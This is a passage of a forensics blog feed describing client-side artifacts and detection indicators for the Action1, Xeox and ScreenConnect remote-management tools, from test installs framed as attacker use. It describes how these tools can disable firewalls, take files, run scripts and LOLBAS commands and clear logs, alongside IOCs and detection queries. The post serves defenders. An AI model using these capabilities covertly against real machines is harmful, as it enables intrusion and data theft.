affiliated with my employer. But they were unwilling to work with me. Arbitrary Execution However, lucky for us, some malicious threat actor was able to use Action1 to deploy malware to a victim host. Credit to the @Kostastsale of the fantastic @TheDFIRRepot for reporting the details we need for his part of the report. His full tweet thread is here. As illustrated below, we should see a folder created under "C:\Windows\Action1\package_downloads\" with a binary executable inside. Using standard "evidence of execution" investigative techniques will easily detect this activity. The behavior observed when the admin launches PowerShell or CMD commands and scripts is captured below: Note: As I seem to have experienced, Action1 seems to have put in additional protections following this abuse. Enumerate open TCP sessions I ran one of the built-in scripts to enumerate open TCP sessions to external IP addresses. During this process I observed the following process lineage: action1_agent.exe -&gt; powershell.exe -&gt; nslookup.exe. Disable the windows firewall I ran a pre-built job to disable the windows firewall which ran successfully. This created a new *.log file in the logs directory. Several files and folders were also created to support his action as illustrated in the Noriben/procmon output below. The log filename contains a timestamp indicating when the logging started. This correlates nicely with the MFT timestamps as well as the first line in the log file itself. Deploy from "App Store" I also tested deploying a software install package (Splashtop Streamer) from their "app store." This also created a new log file in the logs directory. Remote Control After the user allows the Action1 admin to remote into the client machine, the action1_agent.exe process spawned three instances of action1_remote.exe, as seen below: The timestamp of the execution of action1_remote.exe can serve investigators well to determine when this happened. But it is also recorded in the main log file. From these events we can see that the software is using WMI to collect screen and monitoring information. This is corroborated by correlating events in the WMI logs (Microsoft-Windows-WMI-Activity/Operational.evtx). We also will see this command line in process execution events: CommandLine: "C:\WINDOWS\Action1\action1_agent.exe" monitorcount Closing the session is not possible from the user side (aside from taskkill operations). It appears the only way to end the session is to simply close the browser window, returning you back to the previous tab with the admin console. The session appears to be using some amount of VNC code perform this remote control capability. This is evident in the log file during the time the session is closed. User Interaction Upon initiating a remote view/control session, the user on the client device would see a popup message like this one: Data Exfil Apart from arbitrary script execution, I didn't see a web GUI capability to pull files off the client device. IOCs and TTPs TTP/IOC Description https://app.action1.com/agent/*/Windows/agent(*).msi URL to a downloadable MSI installer Sysmon eventCode=1 c:\windows\action1\action1_agent.exe Evidence of execution. The PE is designed to run as a service, so source=system.evtx EventCode=7045 could also be used. action1_agent.exe -&gt; powershell.exe -&gt; nslookup.exe nslookup as the grandchild process of action1_agent.exe suggests admin directed recon of open network sessions with external IPs. Sysmon eventCode=1action1_remote.exe Evidence of action1 being used for remote control. server.action1.coma1-server-prod-odd.action1.comus-cdn.action1.com Domain IOCs 54.210.188.13 54.227.102.112 IP IOCs]]></summary></entry><entry><title type="html">RMM - Xeox: Client Side Evidence</title><link href="https://dfirtnt.github.io/2023/08/01/rmm-xeox-client-side-evidence/" rel="alternate" type="text/html" title="RMM - Xeox: Client Side Evidence" /><published>2023-08-01T18:54:22-04:00</published><updated>2023-08-01T18:54:22-04:00</updated><id>https://dfirtnt.github.io/2023/08/01/rmm-xeox-client-side-evidence</id><content type="html" xml:base="https://dfirtnt.github.io/2023/08/01/rmm-xeox-client-side-evidence/"><![CDATA[- LOL_M&amp;Ms
- RMM
<p><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd"><br />
<html><body></p>
<p>As we continue our series on Remote Monitoring and Management (RMM) tools, this time we turn our eyes to Xeox! Although I found no public reporting on this tool being used by threat actors, a colleague worked on a recent incident where this was the RMM tool of choice for the adversary (a criminal TA referred to as Scattered Kitten). With that in mind, let's look at what this tool is, what its capabilities are, and let's figure out what detection opportunities there may be and what forensic artifacts it leaves behind. Click <a href="#ioc-ttps"><strong>here</strong></a> if you want to skip straight to the TTP/IOC section.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p><strong>Capabilities</strong></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>Their web page lists numerous remote management capabilities. It doesn't offer direct remote control capabilities, but it offers the ability to install several other remote desktop tools, and the Xeox user can use the web UI to start these tools (although, as you can see below, their capabilities are in "beta").</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/07/image-16.png?w=520" alt="" width="192" height="339"></td>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/07/image-29.png?w=844" alt="" width="447" height="211"></td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p></p>
<p>The software is published by "<strong>hs2n Informationstechnologie GmbH</strong>". "GmbH" stands for "Gesellschaft mit beschränkter Haftung," which is a German term for a "company with limited liability" in English. It is a legal structure used predominantly in Germany and Austria, as well as some other German-speaking countries. This particular company appears to be Austrian, as their address is in Austria and the IP addresses of their servers are also located in Austria.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>There is no software for the administrator and all admin tasks are performed through the web interface.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p><strong>Testing Details</strong></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>Testing was done with Xeox version 2.0.0.47 with the “victim” device being Windows10 v1709 (OS Build 16299.309). Telemetry used was</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<ul>
</p>
<li>Sysmon (with the Swift-on-Security config),</li>
<p><!-- /wp:list-item --></p>
<p></p>
<li>PowerShell script block logging and transcripts were enabled.</li>
<p><!-- /wp:list-item --></p>
<p></p>
<li>Noriben was used to automate Procmon output.</li>
<p><!-- /wp:list-item --></p>
<p></p>
<li>Manual process analysis performed with ProcessHacker.</li>
<p><!-- /wp:list-item -->
</ul>
<p><!-- /wp:list --></p>
<p></p>
<p><strong>Client Installer</strong></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-table alignleft">
<table>
<tbody>
<tr>
<td>After setting up a 30 day free trial, I was offered the ability to deploy agents in a few different ways.  Each of which lead to the downloading and execution of an installer exe named XEOX_Agent_for_gmail_com14-2_0_0_47.exe</td>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/07/image-17.png?w=1024" alt=""></td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p></p>
<figure class="wp-block-image alignright size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/07/image-18.png?w=1024" alt="" class="wp-image-527" style="width:570px;height:69px" width="570" height="69"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p class="has-text-align-left">Testing the "Install with PowerShell.exe" option creates a 4104 event in the powershell operational log and records the URL.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image alignright size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image.png?w=842" alt="" class="wp-image-557" style="width:300px;height:231px" width="300" height="231"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>I chose to download the installer manually and run through the MSI wizard. I selected all components: </p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>The "Testing Internet Connection" option appears to launch the following during the final minutes of the installation:</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image aligncenter size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-2.png?w=1024" alt="" class="wp-image-562" style="width:767px;height:225px" width="767" height="225"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>xeox-agent_x64.exe is now running as a Service (with System privileges) and a version file appears in C:\Program Files (x86)\XEOX\Version.txt.   In this case, the version is 2.0.0.47.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>Once installed, the agent is relatively silent, at least from a user perspective. There are no popups reminding the user this is running, and there is no icon in the systray area. But as we know, RMM tools "can hide, but they must run."</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>During the install, xeox drops numerous  *.pyd files (indicative of compiled python code) and several portable executables. </p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-1.png?w=1024" alt="" width="418" height="220"></td>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-5.png?w=306" alt="" width="165" height="180"></td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p></p>
<p><strong>Persistence</strong></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>Xeox established persistence via a Service which is setup to run automatically with System-level privileges. It also sets up a scheduled task to run every 6 hours to ensure the exe is up and running.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-3.png?w=875" alt="" width="324" height="228"></td>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/07/image-23-edited.png" alt="" width="410" height="312"></td>
</tr>
</tbody>
</table>
<figcaption class="wp-element-caption">Persistence</figcaption>
</figure>
<p><!-- /wp:table --></p>
<p></p>
<p><strong>Log Files</strong></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-table alignleft">
<table>
<tbody>
<tr>
<td>The software does quite a bit of logging to record the actions being taken. It writes these events into log files within the C:\Program Files\XEOX\log\ folder. Little to no events appear in the Windows Application log.</td>
<td><img style="width: 800px" src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-7.png?w=324" alt=""></td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p></p>
<p><strong>Network</strong></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>The following hostnames and IPs are contacted routinely.</td>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/07/image-25.png?w=1024" alt="" style="width: 2000px"></td>
</tr>
<tr>
<td>The agent performs a heartbeat network connection attempt every 900 seconds to ask if there are any new instructions to carry out. </td>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/07/image-24.png?w=1024" alt=""></td>
</tr>
<tr>
<td>Reviewing a pcap from this traffic indicated there was no User-Agent string in the headers of this traffic.</td>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-6.png?w=708" alt="" width="288" height="222"></td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p></p>
<p><strong>Dynamic Filesystem Folder</strong></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>The software regularly reviews current windows updates leveraging the <a href="https://wuinstall.com/">wuinstall</a> software (made by the same company).  Ephemeral files such as *.ini and logs are created in a randomly named folder within the application directory. For example: C:\PROGRAM FILES\XEOX\<mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-bright-blue-color"><strong>WORK</strong></mark>\22943007\WUINSTALL_1689365938.LOG. The "22943007" folder will later be deleted and replaced as new jobs are introduced.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>Additionally, the system enumerates hardware and software data via WMI. As seen on the right, the enumeration is very thorough.</td>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/07/image-26.png?w=806" alt="" style="width: 1600px"></td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>Following this enumeration, the results are sent back to the servers in Austria as indicated in several of the *.log files.</td>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/07/image-27.png?w=1024" alt="" style="width: 1100px"></td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p></p>
<p>Similar enumeration scripts are run to collect software, services, and more. This information appears  back in the web UI console as follows:</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/07/image-28.png?w=1024" alt="" class="wp-image-548"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p><strong>File/Data Exfiltration</strong></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>Xeox provides a "Job Editor" that allows numerous actions to be taken against client devices.  I tested several of them. Let's start with transferring a file from the client to the server. The web UI provides a somewhat intuitive drag and drop builder. I created a test file call exfil.txt</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-9.png?w=653" alt="" width="221" height="347"></td>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-10.png?w=865" alt="" width="513" height="310"></td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p></p>
<p>The only indication I could find of this activity was from within Xeox the *.log files.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image aligncenter size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-11.png?w=1024" alt="" class="wp-image-580" style="width:643px;height:279px" width="643" height="279"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>We can see in the web UI that the file has been successfully exfiltrated. Clicking on the below hotlink begins a download of the file through the browser.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image aligncenter size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-12.png?w=1024" alt="" class="wp-image-583" style="width:394px;height:193px" width="394" height="193"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p><strong>Arbitrary Script Execution</strong></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>Next I tried running a powershell script to launch calc.exe. The Script editor supports powershell and batch scripting. </td>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-13.png?w=1024" alt="" style="width: 1200px"></td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p></p>
<p>I noticed in the Noriben output that the xeox-agent_x64 launched a child version of itself, which then launched powershell.exe. As you can see, it has packaged the script as a randomly named *.ps1 file, the contents of which would be visible in Script Block log events and powershell transcripts. </p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-14.png?w=1024" alt="" class="wp-image-589"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>As we might expect, the *.log files are also very verbose in tracking this activity.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image aligncenter size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-15.png?w=1024" alt="" class="wp-image-591" style="width:328px;height:169px" width="328" height="169"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p><strong>Arbitrary LOLBAS code execution</strong></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>The next test was to run a command with a built-in ("Living of the Land") executable. For this test I used <a rel="noreferrer noopener" href="https://atomicredteam.io/defense-evasion/T1218/" target="_blank">rundll32.exe command</a> lovingly stolen from the <a href="https://twitter.com/redcanary" target="_blank" rel="noreferrer noopener">Red Canary's</a> Atomic Red Team test set. The web UI job builder ran with the following parameters:<br></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-16.png?w=1024" alt="" class="wp-image-593"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>This worked beautifully and created Sysmon and *.log event artifacts.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-21.png?w=1024" alt="" class="wp-image-600"></figure>
<p><!-- /wp:image --></p>
<p></p>
<figure class="wp-block-image size-large"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-20.png?w=1024" alt="" class="wp-image-599"></figure>
<p><!-- /wp:image --></p>
<p></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>We also saw in Process Hacker a process lineage story similar to the powershell test.</td>
<td><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/08/image-22.png?w=383" alt=""></td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p></p>
<p><strong>Additional Capabilities</strong></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>There are many more capabilities offered in the web UI, such as: </p>
<p><!-- /wp:paragraph --></p>
<p></p>
<ul>
</p>
<li>download a file via aria2c.exe</li>
<p><!-- /wp:list-item --></p>
<p></p>
<li>delete shadow copies</li>
<p><!-- /wp:list-item --></p>
<p></p>
<li>clear event logs</li>
<p><!-- /wp:list-item --></p>
<p></p>
<li>send a windows message</li>
<p><!-- /wp:list-item --></p>
<p></p>
<li>installing software via Chocolatey</li>
<p><!-- /wp:list-item -->
</ul>
<p><!-- /wp:list --></p>
<p></p>
<p>Based on this initial testing, there seems to be a high likelihood  that these actions would also appear in the *.log files, Sysmon (or other commandline logging events) and security logs.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p id="ioc-ttps"><strong>A Summary of Indicators / TTPs</strong></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>
<strong>TTP</strong> <strong>/ IOCs</strong>
</td>
<td><strong>Analytic</strong></td>
</tr>
<tr>
<td>Xeox service installed</td>
<td>source=system.evtx EventCode=7045<br>Message = “*xeox*"</td>
</tr>
<tr>
<td>Xeox scheduled task</td>
<td>source=security.evtx  EventCode=4698<br>Message = "*XEOX*Agent*Watchdog*"</td>
</tr>
<tr>
<td>Domain IOCs</td>
<td>login.xeox.com<br>agent1.xeox.com<br>ws01.xeox.com<br>ws03.xeox.com</td>
</tr>
<tr>
<td>IP IOCs</td>
<td>80.80.250.154<br>80.80.250.153</td>
</tr>
<tr>
<td>Process Tree TTPs</td>
<td>xeox-agent_x64.exe  &gt; powershell.exe<br>xeox-agent_x64.exe  &gt; cmd.exe<br>xeox-agent_x64.exe   &gt; conhost.exe</td>
</tr>
<tr>
<td>FileName IOCs</td>
<td>createThirdPartySoftwareInventory.bat<br>xeox-agent_x64.exe<br>aria2c.exe (where file path includes *Xeox*</td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --><br />
</body></html></p>]]></content><author><name>Andrew Skatoff</name></author><category term="Forensics" /><category term="Log Analysis" /><summary type="html"><![CDATA[- LOL_M&amp;Ms - RMM As we continue our series on Remote Monitoring and Management (RMM) tools, this time we turn our eyes to Xeox! Although I found no public reporting on this tool being used by threat actors, a colleague worked on a recent incident where this was the RMM tool of choice for the adversary (a criminal TA referred to as Scattered Kitten). With that in mind, let's look at what this tool is, what its capabilities are, and let's figure out what detection opportunities there may be and what forensic artifacts it leaves behind. Click here if you want to skip straight to the TTP/IOC section. Capabilities Their web page lists numerous remote management capabilities. It doesn't offer direct remote control capabilities, but it offers the ability to install several other remote desktop tools, and the Xeox user can use the web UI to start these tools (although, as you can see below, their capabilities are in "beta"). The software is published by "hs2n Informationstechnologie GmbH". "GmbH" stands for "Gesellschaft mit beschränkter Haftung," which is a German term for a "company with limited liability" in English. It is a legal structure used predominantly in Germany and Austria, as well as some other German-speaking countries. This particular company appears to be Austrian, as their address is in Austria and the IP addresses of their servers are also located in Austria. There is no software for the administrator and all admin tasks are performed through the web interface. Testing Details Testing was done with Xeox version 2.0.0.47 with the “victim” device being Windows10 v1709 (OS Build 16299.309). Telemetry used was Sysmon (with the Swift-on-Security config), PowerShell script block logging and transcripts were enabled. Noriben was used to automate Procmon output. Manual process analysis performed with ProcessHacker. Client Installer After setting up a 30 day free trial, I was offered the ability to deploy agents in a few different ways. Each of which lead to the downloading and execution of an installer exe named XEOX_Agent_for_gmail_com14-2_0_0_47.exe Testing the "Install with PowerShell.exe" option creates a 4104 event in the powershell operational log and records the URL. I chose to download the installer manually and run through the MSI wizard. I selected all components: The "Testing Internet Connection" option appears to launch the following during the final minutes of the installation: xeox-agent_x64.exe is now running as a Service (with System privileges) and a version file appears in C:\Program Files (x86)\XEOX\Version.txt.  In this case, the version is 2.0.0.47. Once installed, the agent is relatively silent, at least from a user perspective. There are no popups reminding the user this is running, and there is no icon in the systray area. But as we know, RMM tools "can hide, but they must run." During the install, xeox drops numerous *.pyd files (indicative of compiled python code) and several portable executables. Persistence Xeox established persistence via a Service which is setup to run automatically with System-level privileges. It also sets up a scheduled task to run every 6 hours to ensure the exe is up and running. Persistence Log Files The software does quite a bit of logging to record the actions being taken. It writes these events into log files within the C:\Program Files\XEOX\log\ folder. Little to no events appear in the Windows Application log. Network The following hostnames and IPs are contacted routinely. The agent performs a heartbeat network connection attempt every 900 seconds to ask if there are any new instructions to carry out. Reviewing a pcap from this traffic indicated there was no User-Agent string in the headers of this traffic. Dynamic Filesystem Folder The software regularly reviews current windows updates leveraging the wuinstall software (made by the same company). Ephemeral files such as *.ini and logs are created in a randomly named folder within the application directory. For example: C:\PROGRAM FILES\XEOX\WORK\22943007\WUINSTALL_1689365938.LOG. The "22943007" folder will later be deleted and replaced as new jobs are introduced. Additionally, the system enumerates hardware and software data via WMI. As seen on the right, the enumeration is very thorough. Following this enumeration, the results are sent back to the servers in Austria as indicated in several of the *.log files. Similar enumeration scripts are run to collect software, services, and more. This information appears back in the web UI console as follows: File/Data Exfiltration Xeox provides a "Job Editor" that allows numerous actions to be taken against client devices. I tested several of them. Let's start with transferring a file from the client to the server. The web UI provides a somewhat intuitive drag and drop builder. I created a test file call exfil.txt The only indication I could find of this activity was from within Xeox the *.log files. We can see in the web UI that the file has been successfully exfiltrated. Clicking on the below hotlink begins a download of the file through the browser. Arbitrary Script Execution Next I tried running a powershell script to launch calc.exe. The Script editor supports powershell and batch scripting. I noticed in the Noriben output that the xeox-agent_x64 launched a child version of itself, which then launched powershell.exe. As you can see, it has packaged the script as a randomly named *.ps1 file, the contents of which would be visible in Script Block log events and powershell transcripts. As we might expect, the *.log files are also very verbose in tracking this activity. Arbitrary LOLBAS code execution The next test was to run a command with a built-in ("Living of the Land") executable. For this test I used rundll32.exe command lovingly stolen from the Red Canary's Atomic Red Team test set. The web UI job builder ran with the following parameters: This worked beautifully and created Sysmon and *.log event artifacts. We also saw in Process Hacker a process lineage story similar to the powershell test. Additional Capabilities There are many more capabilities offered in the web UI, such as: download a file via aria2c.exe delete shadow copies clear event logs send a windows message installing software via Chocolatey Based on this initial testing, there seems to be a high likelihood that these actions would also appear in the *.log files, Sysmon (or other commandline logging events) and security logs. A Summary of Indicators / TTPs TTP / IOCs Analytic Xeox service installed source=system.evtx EventCode=7045Message = “*xeox*" Xeox scheduled task source=security.evtx EventCode=4698Message = "*XEOX*Agent*Watchdog*" Domain IOCs login.xeox.comagent1.xeox.comws01.xeox.comws03.xeox.com IP IOCs 80.80.250.15480.80.250.153 Process Tree TTPs xeox-agent_x64.exe &gt; powershell.exexeox-agent_x64.exe &gt; cmd.exexeox-agent_x64.exe &gt; conhost.exe FileName IOCs createThirdPartySoftwareInventory.batxeox-agent_x64.exearia2c.exe (where file path includes *Xeox*]]></summary></entry><entry><title type="html">RMM - ScreenConnect: Client-Side Evidence</title><link href="https://dfirtnt.github.io/2023/07/14/rmm-screenconnect-client-side-evidence/" rel="alternate" type="text/html" title="RMM - ScreenConnect: Client-Side Evidence" /><published>2023-07-14T19:29:59-04:00</published><updated>2023-07-14T19:29:59-04:00</updated><id>https://dfirtnt.github.io/2023/07/14/rmm-screenconnect-client-side-evidence</id><content type="html" xml:base="https://dfirtnt.github.io/2023/07/14/rmm-screenconnect-client-side-evidence/"><![CDATA[- LOL_M&amp;Ms
<p><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd"><br />
<html><body></p>
<p>Inspired by recent <a href="https://media.defense.gov/2023/Jan/25/2003149873/-1/-1/0/JOINT_CSA_RMM.PDF">threat intelligence</a>, I am starting a series on Remote Monitoring and Management (RMM) tools. I wanted start with some testing on ScreenConnect to support investigators who may have a victim device where a user has been tricked into giving control over to an attacker. We want to be able to answer questions like these:</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<ul>
</p>
<li>What can we find out about what happened? </li>
<p><!-- /wp:list-item --></p>
<p></p>
<li>Was malware introduced? </li>
<p><!-- /wp:list-item --></p>
<p></p>
<li>Was sensitive data lost?</li>
<p><!-- /wp:list-item -->
</ul>
<p><!-- /wp:list --></p>
<p></p>
<p><strong>Here is some obligatory background nonsense from JetPack AI:</strong></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>ScreenConnect is a comprehensive remote access tool developed by ConnectWise. With its robust capabilities, ScreenConnect empowers users to securely and conveniently access and control remote computers, servers, and devices from anywhere in the world. Designed with simplicity and efficiency in mind, ScreenConnect facilitates seamless collaboration, troubleshooting, and support for IT professionals and businesses alike. Whether you need to assist a colleague, provide remote technical support, or access your work computer while on the go, ScreenConnect offers a reliable solution that ensures a seamless and secure remote access experience.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p><strong>Testing Details</strong></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>Testing was done with ScreenConnect agent version 23.4.5.8571 with the "victim" device being Windows10 v1709 (OS Build 16299.309). Telemetry used was</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<ul>
</p>
<li> Sysmon (with the Swift-on-Security config), </li>
<p><!-- /wp:list-item --></p>
<p></p>
<li>PowerShell script block logging and transcripts were enabled. </li>
<p><!-- /wp:list-item --></p>
<p></p>
<li>Noriben was used to automate Procmon output.</li>
<p><!-- /wp:list-item --></p>
<p></p>
<li>Memory strings analysis performed with ProcessHacker.</li>
<p><!-- /wp:list-item -->
</ul>
<p><!-- /wp:list --></p>
<p></p>
<p><strong>Installation</strong></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>After signing up for a 14-day free trial and setting up my account, they gave me a custom URL to sign into a web UI where I could manage my fleet of "victim" devices. I was able to create my own subdomain like so: "amskatoff.screenconnect.com".</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/07/image.png?w=1024" alt="" class="wp-image-459" style="width:724px;height:345px" width="724" height="345"><br />
<figcaption class="wp-element-caption">Web UI console to manage my fleet</figcaption>
</figure>
<p><!-- /wp:image --></p>
<p></p>
<p>After clicking on the "Build+" button (located at the top left corner), I was prompted to build an installer and given several options for the target operating system. This was followed by options to download the executable file or share a link to it. The provided link was:</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<pre class="wp-block-code"><code>https://amskatoff.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&amp;y=Guest<br></code></pre>
<p><!-- /wp:code --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/07/image-2.png?w=903" alt="" class="wp-image-464" style="width:350px;height:397px" width="350" height="397"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>Once executed, the installer launched msiexec.exe and installed a service called "ScreenConnect Client (429d9ba6e9123fb4)" which pointed to C:\Program Files (x86)\ScreenConnect Client (429d9ba6e9123fb4)\ScreenConnect.ClientService.exe.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/07/image-6.png?w=685" alt="" class="wp-image-472" style="width:455px;height:516px" width="455" height="516"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>This file then spawned two instances of a child process called ScreenConnect.WindowsClient.exe one with my default credentials and another one running as System.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/07/image-3.png?w=1024" alt="" class="wp-image-468" style="width:742px;height:54px" width="742" height="54"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>The service running as SYSTEM was also recorded in a 4573 event in the Security Log, indicating sensitive privilege use (SeTcbPrivilege).</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/07/image-1.png?w=1024" alt="" class="wp-image-462" style="width:790px;height:366px" width="790" height="366"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>The remote control session was immediately available through the host web interface. There was no prompt to give full control. A telling application log event occurred at this time, showing that I was now connected to the victim's device.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/07/image-4.png?w=1024" alt="" class="wp-image-469" style="width:590px;height:358px" width="590" height="358"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>A similar event was logged when the remote connection was severed.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/07/image-14.png?w=1024" alt="" class="wp-image-498" style="width:655px;height:156px" width="655" height="156"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p>An apparently randomly generated C2 domain (instance-bw7a3j-relay.screenconnect.com) was contacted over port 443 as part of this channel. Similar domain name patterns have been observed in threat intelligence reports.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p><strong>Chatting</strong></p>
<p><!-- /wp:paragraph --></p>
<p></p>
<p>I was unable to find any logs of chat messages. However, my chat strings were found in memory.</p>
<p><!-- /wp:paragraph --></p>
<p></p>
<figure class="wp-block-image size-large is-resized"><img src="https://dfirtnt.wordpress.com/wp-content/uploads/2023/07/image-8.png?w=1024" alt="" class="wp-image-476" style="width:583px;height:211px" width="583" height="211"></figure>
<p><!-- /wp:image --></p>
<p></p>
<p><strong>File Transfers</strong></p>
<p><!-- /wp:paragraph --></p>
<p></p>
